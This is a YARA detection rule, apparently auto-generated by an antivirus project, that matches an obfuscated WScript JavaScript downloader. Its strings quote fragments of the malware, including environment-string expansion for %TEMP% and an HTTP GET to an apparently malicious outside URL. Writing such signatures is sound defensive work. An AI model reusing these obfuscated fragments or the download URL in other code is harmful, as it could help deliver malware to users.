rule sig_20160428_5f1e9ea75e5f789de0ed649637eaa231 {
  meta:
    description = "datamaliciousorder - file 20160428_5f1e9ea75e5f789de0ed649637eaa231.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd5eb0ac6c1d15edc968761b58d7d471c8555d51ddef114673449e6fd294c1ae"

  strings:
    $s1  = "function FbmBkzYleNhzItxJjdZgj(BveMhxBnvNufSuvWsgTbk){UoxOuqMpxSmcKfyNaqSwe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FbmBkzYleNhzItxJjdZgj(BveMhxBnvNufSuvWsgTbk){UoxOuqMpxSmcKfyNaqSwe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function CivQluAqdLhhIfpCleWto() {return UoxOuqMpxSmcKfyNaqSwe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var UoxOuqMpxSmcKfyNaqSwe = function GqwMgoBplTviWqlRrcYff() {return NybRipRieRecHdmOafLhp[WisUzgEbnRekKojNwdBzd](\"WScript\"+\"" ascii
    $s5  = "function RejSsgCjwGigKmcPjcXuw(HbhDqoKppRjeLmaVadMhv, KisTkmMxrHjdEnuDfgUrf){ItlNkwWckPtxPrgQcyAzf = ItlNkwWckPtxPrgQcyAzf * 1; " ascii
    $s6  = "return HbhDqoKppRjeLmaVadMhv - KisTkmMxrHjdEnuDfgUrf;};" fullword ascii
    $s7  = "QrqAbiBsoRscFbaPwxYjy[UwdAgkDzpZurVvgYgbVot](\"G\" + \"ET\", \"http://alex-naumov.ru/j8skdwq\", false);" fullword ascii
    $s8  = "var UoxOuqMpxSmcKfyNaqSwe = function GqwMgoBplTviWqlRrcYff() {return NybRipRieRecHdmOafLhp[WisUzgEbnRekKojNwdBzd](\"WScript\"+\"" ascii
    $s9  = "var NybRipRieRecHdmOafLhp = this[\"WScript\"];" fullword ascii
    $s10 = "function CivQluAqdLhhIfpCleWto() {return UoxOuqMpxSmcKfyNaqSwe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function XjeEjhBrcHifBpmQuvXjo(){return QfcGbmDvfLulDxzChhAij + \"\";};" fullword ascii
    $s12 = "function RejSsgCjwGigKmcPjcXuw(HbhDqoKppRjeLmaVadMhv, KisTkmMxrHjdEnuDfgUrf){ItlNkwWckPtxPrgQcyAzf = ItlNkwWckPtxPrgQcyAzf * 1; " ascii
    $s13 = "if (QrqAbiBsoRscFbaPwxYjy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function ZevZdnFbxRcgWnqHaiPow() {return ((FwkPurUmaUiaFbaFdfZif == true) && (FwkPurUmaUiaFbaFdfZif == ItdQmaMswImkEseXqoZfz)) ?" ascii
    $s15 = "function ZevZdnFbxRcgWnqHaiPow() {return ((FwkPurUmaUiaFbaFdfZif == true) && (FwkPurUmaUiaFbaFdfZif == ItdQmaMswImkEseXqoZfz)) ?" ascii
    $s16 = "var ItdQmaMswImkEseXqoZfz = false;" fullword ascii
    $s17 = "var VbgLtbJpuBsqYcrMxqRfl = false;" fullword ascii
    $s18 = "function FkkElmYkfHoqWgsRedIqx(){return 23;};" fullword ascii
    $s19 = "var GakVjmJepIvkGybYyoKio = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "FwkPurUmaUiaFbaFdfZif = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}